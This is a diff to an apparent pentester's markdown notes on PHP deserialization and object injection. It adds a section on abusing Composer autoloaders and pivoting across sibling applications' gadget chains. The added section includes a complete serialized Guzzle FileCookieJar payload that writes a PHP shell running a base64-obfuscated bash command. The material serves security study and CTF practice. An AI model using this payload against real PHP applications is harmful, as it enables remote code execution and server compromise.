@@ -36,17 +36,17 @@ PHP is known to be one of the languages most vulnerable to deserialization and O
 
 The syntax generally follows the pattern of one-letter code of the variable type, followed by a colon, followed by the variable value, followed by a semicolon.
 
-| Type | Serialization examples |
-| --- | --- |
-| Null | N; |
-| Boolean | b:1;b:0; |
-| Integer | i:685230;i:-685230; |
-| Floating point | d:685230.15;d:INF;d:-INF;d:NAN; |
-| String | s:6:"A to Z"; |
+| Type              | Serialization examples                                                                                           |
+| ----------------- | ---------------------------------------------------------------------------------------------------------------- |
+| Null              | N;                                                                                                               |
+| Boolean           | b:1;b:0;                                                                                                         |
+| Integer           | i:685230;i:-685230;                                                                                              |
+| Floating point    | d:685230.15;d:INF;d:-INF;d:NAN;                                                                                  |
+| String            | s:6:"A to Z";                                                                                                    |
 | Associative array | a:4:{i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:"A to Z";}a:2:{i:42;b:1;s:6:"A to Z";a:3:{i:0;i:1;i:1;i:2;i:2;i:3;}} |
-| Object | O:8:"stdClass":2:{s:4:"John";d:3.14;s:4:"Jane";d:2.718;} |
-| Reference | a:2:{i:0;O:10:"HelloWorld":0:{}i:1;r:2;} r:2; is the reference |
-| Custom | C:19:"SplDoublyLinkedList":33:{i:0;:O:10:"HelloWorld":0:{}:i:42;} |
+| Object            | O:8:"stdClass":2:{s:4:"John";d:3.14;s:4:"Jane";d:2.718;}                                                         |
+| Reference         | a:2:{i:0;O:10:"HelloWorld":0:{}i:1;r:2;} r:2; is the reference                                                   |
+| Custom            | C:19:"SplDoublyLinkedList":33:{i:0;:O:10:"HelloWorld":0:{}:i:42;}                                                |
 
 >[!warning] Common sinks and point of warning
 >- `unserialize()`
@@ -65,8 +65,9 @@ Magic method used with **deserialization** (`unserialize()`, `__unserialize()`):
 - `__destruct()`: is called when PHP script end and object is destroyed.
 - `__toString()`: uses object as string but also can be used to read file or more than that based on function call inside it.
 
->[!danger]
->Also **[Autoload Classes](https://www.php.net/manual/en/language.oop5.autoload.php)** may also be dangerous!
+>[!important] 
+>PHP mechanisms such as **Composer’s `autoload.php`**, **`spl_autoload_register`**, and class inheritance via **`implements`** [^34042] and **`extends`** [^34043] significantly increase the application’s attack surface.
+
 
 ### Classis PHP Object Injection vulnerability
 
@@ -214,6 +215,48 @@ uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(
 
 ```
 
+### PHP Object Injection exploiting `spl_autoload_register`
+
+In modern applications, loading every class file at the start of a request is inefficient. **Autoloaders** [^34045] (like Composer’s `vendor/autoload.php`) solve this by only loading a class file when the code attempts to instantiate a class that hasn't been defined yet. [^34044]
+
+When an application calls `unserialize($user_input)`, the PHP engine attempts to reconstruct the object. If the serialized string references a class that is currently **not loaded** in memory, PHP triggers the registered autoloader to find and include the file defining that class.
+
+Because of the autoloader,  **every class** available in the project's dependencies becomes a potential candidate for a POP chain, even if the main application logic never uses that class.
+
+Steps are:
+- You send a serialized object of a class from a third-party library (e.g., Guzzle, Monolog, or Symfony components).
+- PHP realizes the class is missing and calls the **Autoloader**.
+- The Autoloader finds the class in the `vendor` folder and loads it.
+- PHP finishes instantiating the object and eventually calls its `__destruct()` or `__wakeup()`.
+- The malicious payload inside that library’s gadget is executed
+
+#### Cross-Application Gadget Chain Pivot
+
+Sometimes, it is possible you find *siblings application* with **different libraries**. In this scenario, it is possible to trick the current application `autoloader` into using the other application's autoloader, thus importing the other application's libraries and gadgets. 
+
+>[!example]
+>If App A's code is vulnerable to `unserialize()`, it can only "see" classes already loaded in App A's memory or those App A's autoloader knows how to find. 
+>
+>Then, there is also an App B, with a class `www_frontend_vendor_autoload`
+
+When PHP deserializes `O:28:"www_frontend_vendor_autoload":0:{}`, it triggers the constructor or an include logic that calls:
+
+```php
+require_once('/www/frontend/vendor/autoload.php');
+```
+
+Once this line executes during the deserialization process of the first element in your array (`Extra`), the **PHP process memory** is updated. Every class in App B’s `vendor` folder is now available for the rest of the current request.
+
+Because of this refresh, it is possible to inject an array of serialized objects in order to first *refresh* available classes, and then instantiate new objects from these classes:
+
+```php
+a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
+```
+
+>[!tip]
+>When mixing gadgets across apps via autoloading, remember **private properties in gadget definitions may be dropped** when classes are re-declared differently in the target; edit the  gadget’s `chain.php` to make properties `public` if the payload arrives with empty values
+
+
 ### Bypass checks on serialized object exploiting parser differentials
 
 - [WAFfle-y Order](../../Play%20ground/CTFs/WAFfle-y%20Order.md)
@@ -333,7 +376,7 @@ class CustomTemplate {
 ?>
 ```
 
-Poc exploiting a [Server Side Template Injection (SSTI)](Server%20Side%20Template%20Injection%20(SSTI).md) combined with the deserialization.vGenerated a PHP/JPEG polyglot image to bypass file upload restrictions still having a valid PHP [^polyglot] :
+Poc exploiting a [Server Side Template Injection (SSTI)](Server%20Side%20Template%20Injection%20(SSTI).md) combined with the deserialization. Generated a PHP/JPEG polyglot image to bypass file upload restrictions still having a valid PHP [^polyglot] :
 
 [^polyglot]: https://github.com/kunte0/phar-jpg-polyglot/tree/master
 
@@ -916,3 +959,11 @@ Standard steps for research:
 - [Deserialization - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
 
 [^34041]: https://www.youtube.com/watch?v=tEfjSs4fq8M&ab_channel=BugBountyReportsExplained; RCE via deserialization with a class allowlist bypass and DNS exfiltration with Arthur Aires
+
+[^34042]: https://www.php.net/manual/en/language.oop5.interfaces.php
+
+[^34043]: https://www.php.net/manual/en/reflection.extending.php
+
+[^34044]: Read as an example [You Already Have Our Personal Data, Take Our Phone Calls Too (FreePBX CVE-2025-57819)](../../Raindrop/You%20Already%20Have%20Our%20Personal%20Data,%20Take%20Our%20Phone%20Calls%20Too%20(FreePBX%20CVE-2025-57819).md)
+
+[^34045]: https://www.php.net/manual/en/language.oop5.autoload.php
